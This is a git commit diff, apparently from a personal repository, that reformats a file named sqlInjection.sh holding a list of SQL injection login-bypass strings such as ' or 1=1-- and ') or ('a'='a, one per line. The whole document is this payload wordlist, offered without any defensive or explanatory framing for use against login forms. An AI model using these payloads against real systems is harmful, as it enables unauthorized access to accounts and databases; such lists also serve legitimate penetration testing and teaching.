2a60626990ba2a834a088d49af4672dee7122597
Ryan Dewantoro <riiean@umsida.ac.id>
2020-11-13 12:14:41 +0700

    Update sqlInjection.sh

--- shell/login/sqlInjection.sh
+++ shell/login/sqlInjection.sh
@@ -1,6 +1,15 @@
-or 1=1--	" or "1"="1	") or ("a"="a
-" or 1=1--	' or 1=1--	tes " or "a"="a
-or 0=0#	' or = 0=0#	tes' or 'a'='a
-" or 0=0#	or 1=1--	tes") or ("a"="a
-' or '0'='0	') or ('a'='a	tes') or ('a'='a
- 
+or 1=1--
+" or 1=1--
+or 0=0#
+" or 0=0#
+' or '0'='0
+" or "1"="1
+' or 1=1--
+' or = 0=0#
+or 1=1--
+') or ('a'='a
+") or ("a"="a
+tes " or "a"="a
+tes' or 'a'='a
+tes") or ("a"="a
+tes') or ('a'='a
